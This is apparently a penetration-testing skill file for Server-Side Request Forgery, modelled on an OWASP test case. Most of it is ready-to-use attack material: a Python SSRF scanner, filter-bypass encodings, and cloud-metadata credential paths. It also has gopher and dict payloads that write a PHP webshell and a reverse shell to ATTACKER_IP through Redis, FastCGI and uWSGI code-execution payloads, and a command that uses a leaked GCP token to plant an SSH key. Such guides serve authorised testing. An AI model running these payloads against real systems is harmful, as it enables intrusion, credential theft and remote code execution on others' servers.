---
name: wstg-inpv-19
description: "Testing for Server-Side Request Forgery (SSRF)"
category: input-validation
owasp_id: WSTG-INPV-19
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "A URL-preview/import/webhook feature that fetches attacker-controlled external content via SSRF and stores/renders it for other users without sanitization turns an internal-network-pivot vulnerability into persistent Stored XSS = Critical (Internal Access + Mass Client Compromise)"
---

# wstg-inpv-19

## Test ID

WSTG-INPV-19

## Test Name

Testing for Server-Side Request Forgery (SSRF)

## High-Level Description

Server-Side Request Forgery (SSRF) occurs when an attacker can make the server-side application make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to attack internal services, access cloud metadata, scan internal networks, or bypass access controls.

---

## What to Check

- [ ] URL parameter manipulation
- [ ] Internal service access
- [ ] Cloud metadata access
- [ ] Protocol smuggling
- [ ] Blind SSRF
- [ ] DNS rebinding

---

## How to Test

### Step 1: Identify SSRF Entry Points

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for SSRF..."

# Test URL parameters
ENDPOINTS=(
    "/proxy?url="
    "/fetch?url="
    "/api/webhook?callback="
    "/share?url="
    "/preview?link="
)

# SSRF payloads
PAYLOADS=(
    "http://127.0.0.1/"
    "http://localhost/"
    "http://[::1]/"
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/"
    "http://192.168.1.1/"
    "http://10.0.0.1/"
    "file:///etc/passwd"
)

for endpoint in "${ENDPOINTS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        response=$(curl -s "$TARGET$endpoint$payload")
        echo "Testing: $endpoint$payload"
        echo "Response: ${response:0:100}"
    done
done
```

### Step 2: SSRF Vulnerability Tester

```python
#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) Vulnerability Tester
"""

import requests
import socket
import re
from urllib.parse import quote

class SSRFTester:
    def __init__(self, url, param='url'):
        self.url = url
        self.param = param
        self.findings = []
        self.session = requests.Session()

    # SSRF payloads
    PAYLOADS = {
        'localhost': [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://127.0.0.1:80/',
            'http://127.0.0.1:443/',
            'http://127.0.0.1:8080/',
            'http://127.0.0.1:22/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'http://0177.0.0.1/',  # Octal
            'http://2130706433/',   # Decimal
            'http://0x7f.0x0.0x0.0x1/',  # Hex
            'http://127.1/',
            'http://127.0.1/',
        ],
        'cloud_metadata': [
            # AWS
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',

            # GCP
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',

            # Azure
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',

            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',

            # Alibaba
            'http://100.100.100.200/latest/meta-data/',
        ],
        'internal_network': [
            'http://192.168.0.1/',
            'http://192.168.1.1/',
            'http://10.0.0.1/',
            'http://172.16.0.1/',
            'http://intranet/',
            'http://internal/',
        ],
        'protocols': [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:25/_HELO%20localhost',
            'dict://127.0.0.1:11211/stats',
            'ftp://127.0.0.1/',
        ],
        'bypass': [
            # URL encoding
            'http://127.0.0.1%2f',
            'http://127.0.0.1%09',

            # Domain confusion
            'http://127.0.0.1.nip.io/',
            'http://localtest.me/',
            'http://spoofed.burpcollaborator.net@127.0.0.1/',

            # URL parser confusion
            'http://foo@127.0.0.1/',
            'http://127.0.0.1#@evil.com/',
            'http://127.0.0.1?@evil.com/',

            # IPv6
            'http://[0:0:0:0:0:ffff:127.0.0.1]/',
            'http://[::ffff:127.0.0.1]/',
        ],
    }

    def test_localhost_access(self):
        """Test access to localhost"""
        print("\n[*] Testing localhost access...")

        for payload in self.PAYLOADS['localhost']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for localhost indicators
                if response.status_code == 200:
                    if any(indicator in response.text.lower() for indicator in
                           ['apache', 'nginx', 'server', 'welcome', 'index']):
                        print(f"[VULN] Localhost access: {payload}")
                        self.findings.append({
                            'type': 'SSRF - Localhost Access',
                            'payload': payload,
                            'severity': 'High'
                        })
                        return True

            except Exception as e:
                pass

        return False

    def test_cloud_metadata(self):
        """Test cloud metadata access"""
        print("\n[*] Testing cloud metadata access...")

        for payload in self.PAYLOADS['cloud_metadata']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for metadata indicators
                metadata_indicators = [
                    'ami-id', 'instance-id', 'security-credentials',
                    'computeMetadata', 'instance', 'project',
                    'iam', 'role', 'credentials',
                ]

                if response.status_code == 200:
                    for indicator in metadata_indicators:
                        if indicator in response.text:
                            print(f"[VULN] Cloud metadata access!")
                            print(f"  Payload: {payload}")
                            self.findings.append({
                                'type': 'SSRF - Cloud Metadata',
                                'payload': payload,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_internal_network(self):
        """Test internal network scanning"""
        print("\n[*] Testing internal network access...")

        for payload in self.PAYLOADS['internal_network']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=5
                )

                if response.status_code == 200 and len(response.text) > 0:
                    print(f"[INFO] Internal endpoint responds: {payload}")
                    self.findings.append({
                        'type': 'SSRF - Internal Network',
                        'payload': payload,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_protocols(self):
        """Test different protocol handlers"""
        print("\n[*] Testing protocol handlers...")

        for payload in self.PAYLOADS['protocols']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                # Check for file content
                if 'root:' in response.text or '[extensions]' in response.text:
                    print(f"[VULN] Protocol handler: {payload.split(':')[0]}://")
                    self.findings.append({
                        'type': f'SSRF - {payload.split(":")[0].upper()} Protocol',
                        'payload': payload,
                        'severity': 'Critical'
                    })

            except Exception as e:
                pass

    def test_bypass_techniques(self):
        """Test SSRF filter bypass techniques"""
        print("\n[*] Testing bypass techniques...")

        for payload in self.PAYLOADS['bypass']:
            try:
                response = self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )

                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[INFO] Bypass payload accepted: {payload[:40]}")

            except Exception as e:
                pass

    def test_blind_ssrf(self, callback_server='YOUR-COLLABORATOR'):
        """Test blind SSRF via callback"""
        print("\n[*] Testing blind SSRF...")

        blind_payloads = [
            f'http://{callback_server}/',
            f'http://{callback_server}/ssrf?test=1',
            f'http://{callback_server}:80/',
            f'http://{callback_server}:8080/',
        ]

        for payload in blind_payloads:
            try:
                self.session.get(
                    self.url,
                    params={self.param: payload},
                    timeout=10
                )
                print(f"  Sent: {payload}")
            except Exception as e:
                pass

        print(f"  [INFO] Check {callback_server} for callbacks")

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("SSRF VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo SSRF vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload'][:60]}")

    def run_tests(self):
        """Run all SSRF tests"""
        self.test_localhost_access()
        self.test_cloud_metadata()
        self.test_internal_network()
        self.test_protocols()
        self.test_bypass_techniques()
        # self.test_blind_ssrf()  # Uncomment with valid callback
        self.generate_report()

# Usage
tester = SSRFTester("https://target.com/fetch", param='url')
tester.run_tests()
```

### Step 3: SSRF Bypass Techniques

```
# IP Address Obfuscation
127.0.0.1 -> 2130706433 (decimal)
127.0.0.1 -> 0x7f000001 (hex)
127.0.0.1 -> 0177.0.0.1 (octal)
127.0.0.1 -> 127.1
127.0.0.1 -> [::ffff:127.0.0.1] (IPv6)

# DNS Rebinding
Use services like nip.io, xip.io
127.0.0.1.nip.io resolves to 127.0.0.1

# URL Parser Confusion
http://foo@127.0.0.1/
http://127.0.0.1#@evil.com/
http://127.0.0.1?@evil.com/
http://evil.com@127.0.0.1/

# Redirect-based bypass
Have evil.com redirect to 127.0.0.1

# Protocol confusion
gopher://127.0.0.1:25/_HELO
dict://127.0.0.1:11211/stats
```

---

## Tools

| Tool              | Purpose                     |
| ----------------- | --------------------------- |
| Burp Collaborator | Blind SSRF detection        |
| SSRFmap           | Automated SSRF exploitation |
| Gopherus          | Gopher payload generator    |

---

## Example Commands/Payloads

```bash
# Cloud metadata (AWS)
curl -s "https://{target}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Localhost / internal probing
curl -s "https://{target}/fetch?url=http://127.0.0.1:22/"
curl -s "https://{target}/fetch?url=http://127.0.0.1.nip.io/"   # DNS-rebinding-style bypass

# Protocol smuggling (gopher for internal service interaction)
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:11211/_stats"

# Blind SSRF via out-of-band collaborator
curl -s "https://{target}/fetch?url=http://{collaborator-id}.oastify.com/"
```

| Payload | Technique | Detection Pattern |
| --- | --- | --- |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | AWS metadata | `AccessKeyId`/role name string in response |
| `http://127.0.0.1:{port}/` | Internal port scan | Response differs per open/closed port (status/timing) |
| `http://2130706433/` / `http://0x7f000001/` / `http://127.1/` | Filter-bypass IP encodings | Same result as `127.0.0.1` despite a blocklist |
| `http://{collaborator}/` | Blind SSRF (OOB) | Callback received on the collaborator listener |
| `file:///etc/passwd` | Protocol smuggling to local file read | `root:` in response |

### URL Parser Discrepancy Bypass

Different HTTP libraries (urllib2, requests, urllib, browsers) resolve authority components of a malformed URL differently — abuse this against allowlist filters that only check the substring:

```bash
curl -s "https://{target}/fetch?url=http://127.1.1.1:80\\@127.2.2.2:80/"
curl -s "https://{target}/fetch?url=http:127.0.0.1/"          # missing // still parsed by some libs
curl -s "https://{target}/fetch?url=http://1.1.1.1%20&@2.2.2.2%23@3.3.3.3/"
```

### Redirect-Based Bypass (evade allowlist by 307/308 redirect from a trusted host)

```bash
# Host an attacker-controlled 307 redirect to the blocked internal target,
# then pass the *whitelisted* redirector URL as the SSRF input (302/307/308 preserve method/body)
curl -s "https://{target}/fetch?url=https://redirector.attacker.tld/?to=http://169.254.169.254/latest/meta-data/"
```

### DNS Rebinding

```bash
# Domain alternates its A record between an allowed IP and 169.254.169.254 on repeat lookups
curl -s "https://{target}/fetch?url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/"
```

### DNS Rebinding Protection Bypasses (from PayloadsAllTheThings)

When the SSRF filter validates the resolved IP of the *first* DNS lookup but the fetch happens on a *second*, separate lookup (TOCTOU), a short-TTL DNS record that flips from an allowed IP to an internal one defeats the check. If the target additionally blocklists private-IP DNS responses at the perimeter, these bypasses evade that filter too:

```bash
# 0.0.0.0 resolves to localhost on most OSes but is NOT in the 127.0.0.0/8 blocklist range
curl -s "https://{target}/fetch?url=http://0.0.0.0:80/"

# CNAME to an internal hostname - filters that only inspect the final A-record IP
# (not the chain) let this through since the DNS response itself contains no raw internal IP
dig cname.attacker.tld +noall +answer   # cname.attacker.tld. IN CNAME internal-service.local.

# "localhost" as a CNAME target bypasses filters that only pattern-match on 127.0.0.1 literal
dig www.attacker.tld +noall +answer     # www.attacker.tld. IN CNAME localhost.
curl -s "https://{target}/fetch?url=http://www.attacker.tld/"

# Full DNS rebinding: register attacker.tld with a very short TTL, resolve to a benign IP on the
# first (validation) lookup, then to 169.254.169.254 on the second (fetch) lookup
# Tooling: nccgroup/singularity (framework), taviso/rbndr (hosted rebinding service)
curl -s "https://{target}/fetch?url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/"
```

Detection signal: response content/timing on the *second* request to the same URL differs from the first (e.g. internal service banner appears only after the rebind window), confirming the app re-resolves DNS between validation and fetch rather than pinning the validated IP.

### JAR Scheme (fully blind protocol wrapper)

```bash
curl -s "https://{target}/fetch?url=jar:http://127.0.0.1!/"
```

### Gopher/Dict RCE Chains Against Internal Services

```bash
# Generate a gopher payload targeting Redis/MySQL/Memcached/SMTP with Gopherus, then:
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A..."   # Redis RCE via CONFIG SET
curl -s "https://{target}/fetch?url=dict://127.0.0.1:11211/stats"                                       # Memcached stats
```

See `assetnote/blind-ssrf-chains` for ready-made chains against Elasticsearch, Consul, Solr, Jenkins, Docker, Redis, and more.

### Upgrade SSRF to XSS (when the fetched content is rendered back)

```bash
curl -s "https://{target}/ssrf.php?url=http://attacker.tld/poc.svg"   # SVG with embedded <script>
```

### URL Parser Confusion (detailed authority-component abuse)

Different consumers of a URL (the app's validator vs. the HTTP client that actually fetches it, or the parser vs. a browser) can disagree on which host is authoritative. Abuse the userinfo `@`, fragment `#`, and query `?` separators to smuggle the "real" allowed host in front of the actual internal target:

```bash
curl -s "https://{target}/fetch?url=http://foo@127.0.0.1/"                # userinfo before real host
curl -s "https://{target}/fetch?url=http://127.0.0.1#@evil-but-allowed.com/"   # fragment hides internal host from naive substring checks
curl -s "https://{target}/fetch?url=http://127.0.0.1?@evil-but-allowed.com/"   # query hides internal host
curl -s "https://{target}/fetch?url=http://evil-but-allowed.com@127.0.0.1/"    # allowed domain as userinfo, real fetch goes to 127.0.0.1
curl -s "https://{target}/fetch?url=http://127.1.1.1:80\\@127.2.2.2:80/"       # backslash confusion between parsers
curl -s "https://{target}/fetch?url=http:127.0.0.1/"                            # missing // still parsed as a URL by some libraries
curl -s "https://{target}/fetch?url=http://1.1.1.1%20&@2.2.2.2%23@3.3.3.3/"     # space/hash-encoded multi-host confusion
```

### Protocol Smuggling — Gopher/Dict Payloads Against Specific Internal Services

Gopher lets an SSRF send raw bytes to any TCP service, effectively becoming a protocol client. Generate ready-made payloads with `Gopherus` or [SSRFmap](https://github.com/swisskyrepo/SSRFmap), then deliver via the vulnerable `url` parameter:

```bash
# Redis - write a webshell to the docroot via the SAVE/CONFIG SET primitive (dict:// works too, one command per request)
curl -s "https://{target}/fetch?url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html"
curl -s "https://{target}/fetch?url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php"
curl -s "https://{target}/fetch?url=dict://127.0.0.1:6379/SET%20mykey%20%22%3C%3Fphp%20system(%24_GET%5B0%5D)%3F%3E%22"
curl -s "https://{target}/fetch?url=dict://127.0.0.1:6379/SAVE"
# Redis reverse shell via gopher (single crafted request, generate with gopherus --exploit redis)
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0Aconfig%20set%20dbfilename%20reverse.php%0D%0Aset%20payload%20%22%3C%3Fphp%20shell_exec(%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2FPORT%200%3E%261%27)%3B%3F%3E%22%0D%0Asave%0D%0A"

# Memcached - unauthenticated deserialization RCE via language-specific gadgets
python2.7 gopherus.py --exploit pymemcache
python2.7 gopherus.py --exploit phpmemcache

# MySQL - execute a query if the account has no password (gopherus --exploit mysql builds the wire-protocol payload)
python2.7 gopherus.py --exploit mysql

# FastCGI - RCE by pointing php.ini at php://input via a known PHP file path (default /usr/share/php/PEAR.php)
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00"

# SMTP - relay/inject headers on an internal mail server
curl -s "https://{target}/fetch?url=gopher://internal-mail:25/_MAIL%20FROM:<attacker@example.com>%0D%0A"

# uWSGI - execute arbitrary Python file via UWSGI_FILE variable (uwsgi_exp.py in wofeiwo/webcgi-exploits)
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py"

# Zabbix agent - remote command execution when EnableRemoteCommands=1
curl -s "https://{target}/fetch?url=gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D"

# DNS AXFR - full zone transfer via a crafted gopher packet to an internal DNS resolver (build with Python, see SSRFmap axfr module)
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' "https://{target}/ssrf" --output - | xxd
```

### HTTP Request Splitting via Gopher

Because `gopher://` sends raw bytes verbatim, any protocol that speaks plaintext-over-TCP (including raw HTTP to a second internal-only vhost) can be smuggled through a single SSRF, effectively giving a fully attacker-controlled request (arbitrary headers/method/body) to whatever is listening on the target port — this is the underlying primitive that powers the Redis/Memcached/SMTP/FastCGI payloads above and generalizes to any unauthenticated TCP service reachable only from the vulnerable host.

### Cloud Metadata Endpoints — Full Reference (per provider)

**AWS EC2** (IMDSv1, no auth header needed):

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://[fd00:ec2::254]/latest/meta-data/          # IPv6 endpoint
```

IMDSv2 (token-gated, defeats a plain GET-based SSRF unless the app forwards custom headers):

```bash
export TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token")
curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
```

WAF/filter-bypass encodings of `169.254.169.254` (try each against a blocklist filter):

```
http://instance-data
http://169.254.169.254.nip.io/
http://425.510.425.510                 # dotted decimal w/ overflow
http://2852039166                      # dotless decimal
http://7147006462                      # dotless decimal w/ overflow
http://0xA9.0xFE.0xA9.0xFE              # dotted hex
http://0xA9FEA9FE                       # dotless hex
http://0x41414141A9FEA9FE               # dotless hex w/ overflow
http://0251.0376.0251.0376              # dotted octal
http://0251.00376.000251.0000376        # dotted octal w/ padding
http://0251.254.169.254                 # mixed octal + decimal
http://[::ffff:a9fe:a9fe]               # IPv6 compressed
http://[0:0:0:0:0:ffff:a9fe:a9fe]       # IPv6 expanded
http://[0:0:0:0:0:ffff:169.254.169.254] # IPv6/IPv4 mixed
http://[fd00:ec2::254]                  # IPv6 metadata endpoint
```

**AWS ECS** (container credentials via task metadata, not the standard IMDS path):

```bash
# read /proc/self/environ via the SSRF/LFI to get the container credential UUID first
curl "http://169.254.170.2/v2/credentials/<UUID>"
```

**AWS Elastic Beanstalk**:

```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

```bash
aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/ --profile leaked
```

**AWS Lambda** (custom runtime invocation API, targets the execution environment itself):

```
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

**GCP** (requires `Metadata-Flavor: Google` header on v1, no header on v1beta1):

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/                       # no header required
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
```

If the app can't set the `Metadata-Flavor` header directly, smuggle it via a raw gopher request:

```bash
curl -s "https://{target}/fetch?url=gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a"
```

Weaponize a leaked service-account token by pushing an SSH key:

```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/[PROJECT_ID]/setCommonInstanceMetadata" \
  -H "Authorization: Bearer [LEAKED_TOKEN]" -H "Content-Type: application/json" \
  --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

**Azure** (requires `Metadata: true` header):

```
http://169.254.169.254/metadata/v1/maintenance                                                                # legacy
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

**DigitalOcean**:

```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

**Alibaba Cloud**:

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

**Oracle Cloud**:

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

**Hetzner Cloud**:

```
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

**Packetcloud**: `http://metadata.packet.net/userdata`

**OpenStack / RackSpace**: `http://169.254.169.254/openstack`

**HP Helion**: `http://169.254.169.254/2009-04-04/meta-data/`

**Kubernetes etcd** (unauthenticated API keys/secrets exposure):

```bash
curl -L "http://127.0.0.1:2379/version"
curl "http://127.0.0.1:2379/v2/keys/?recursive=true"
```

**Docker Engine API / socket**:

```bash
curl -s "http://127.0.0.1:2375/v1.24/containers/json"
# via mounted socket (container-escape path, not classic SSRF but same primitive)
curl --unix-socket /var/run/docker.sock http://foo/containers/json
curl --unix-socket /var/run/docker.sock http://foo/images/json
```

**Rancher**: `http://rancher-metadata/<version>/<path>`

Real-world SSRF-to-cloud-credential examples: Jira SSRF → AWS IAM disclosure via `.../plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`; the *flAWS* cloud wargame proxy challenge exposing `/latest/meta-data/iam/security-credentials/flaws/`.

---

## Remediation

```python
# Python - URL validation
from urllib.parse import urlparse
import ipaddress
import socket

BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254']
ALLOWED_SCHEMES = ['http', 'https']

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False

        # Resolve hostname
        hostname = parsed.hostname
        if not hostname:
            return False

        # Block known dangerous hosts
        if hostname in BLOCKED_HOSTS:
            return False

        # Resolve IP and check for internal
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

        return True
    except:
        return False
```

---

## Risk Assessment

| Finding                    | CVSS | Severity |
| -------------------------- | ---- | -------- |
| SSRF cloud metadata access | 9.8  | Critical |
| SSRF to internal services  | 8.6  | High     |
| SSRF localhost access      | 7.5  | High     |
| Blind SSRF                 | 5.3  | Medium   |

---

## CWE Categories

| CWE ID      | Title                              |
| ----------- | ---------------------------------- |
| **CWE-918** | Server-Side Request Forgery (SSRF) |


---

## References

- [OWASP WSTG - WSTG-INPV-19: Testing for Server-Side Request Forgery](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
- [PayloadsAllTheThings - Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [PayloadsAllTheThings - DNS Rebinding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DNS%20Rebinding)

---

## Checklist

```
[ ] Localhost access tested
[ ] Cloud metadata tested
[ ] Internal network tested
[ ] Protocol handlers tested
[ ] Bypass techniques tested
[ ] Blind SSRF tested
[ ] Findings documented
```
